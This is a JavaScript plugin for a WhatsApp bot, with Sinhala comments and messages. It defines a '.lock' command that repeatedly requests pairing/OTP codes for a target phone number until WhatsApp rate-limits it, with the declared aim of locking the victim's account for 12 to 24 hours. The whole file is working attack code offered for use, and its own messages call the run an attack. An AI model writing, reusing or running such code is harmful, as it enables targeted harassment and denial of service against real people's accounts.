const { cmd } = require('../command');

cmd({
    pattern: "lock",
    alias: ["otp-lock", "block-target"],
    desc: "Lock target WhatsApp for 12-24 hours using OTP loop.",
    category: "owner",
    use: '.lock 947xxxxxxxx',
    filename: __filename
},
async(conn, mek, m, { from, q, isOwner, reply }) => {
    try {
        // 1. අයිතිකරු පරීක්ෂාව (Security First)
        if (!isOwner) return reply("මෙය පාවිච්චි කිරීමට DEXTER හට පමණක් අවසර ඇත. 🚫");

        // 2. අංකය ඇතුළත් කර ඇත්දැයි බැලීම
        if (!q) return reply("කරුණාකර ඉලක්කගත අංකය ලබා දෙන්න. \n\nඋදා: .lock 947xxxxxxxx");

        // අංකය පමණක් වෙන් කර ගැනීම
        let target = q.replace(/[^0-9]/g, '');

        if (target.length < 10) return reply("අංකය වැරදියි. කරුණාකර නිවැරදි අංකයක් ලබා දෙන්න.");

        reply(`🔒 *DEXTER LOCK SYSTEM ACTIVATED*\n\n🎯 Target: ${target}\n⚙️ Status: Requesting OTPs...\n\nමෙම ක්‍රියාවලිය විනාඩි කිහිපයක් ගතවේ. බොට් Restart වීම වැළැක්වීමට තත්පර 3ක පරතරයක් සහිතව ක්‍රියාත්මක වේ.`);

        // 3. OTP Spam Loop එක
        // ආරම්භයට වට 25ක් දාමු (මෙය බෑන් නොවී වැඩ කිරීමට හොඳම ප්‍රමාණයයි)
        for (let i = 0; i < 25; i++) {
            try {
                // වට්සැප් වෙත OTP කෝඩ් රික්වෙස්ට් එකක් යැවීම
                await conn.requestPairingCode(target);
                
                console.log(`[LOG] Successfully requested code ${i + 1} for ${target}`);

                // සර්වර් එක Restart වීම වැළැක්වීමට තත්පර 3ක විරාමයක්
                await new Promise(resolve => setTimeout(resolve, 3000)); 

            } catch (err) {
                // වට්සැප් එකෙන් "Too Many Requests" (429) Error එක ආවොත් එතනින් නවත්වනවා
                if (err.message.includes('429') || err.message.includes('rate-overlimit')) {
                    console.log("Limit reached. Target is likely locked.");
                    return reply(`✅ සාර්ථකයි! ${target} සඳහා උපරිම සීමාව කරා ළඟා වුණා. දැන් එම අංකය පැය 12-24 කට Lock වී ඇත.`);
                }
                console.error("Error in loop:", err.message);
            }
        }

        reply(`✅ ප්‍රහාරය අවසන්! \n\n${target} වෙත උපරිම OTP ප්‍රමාණයක් යවා ඇත. බොහෝ දුරට එම අංකය දැන් Lock වී පවතිනු ඇත.`);

    } catch (e) {
        console.log(e);
        reply("දෝෂයක් ඇති විය: " + e.message);
    }
});
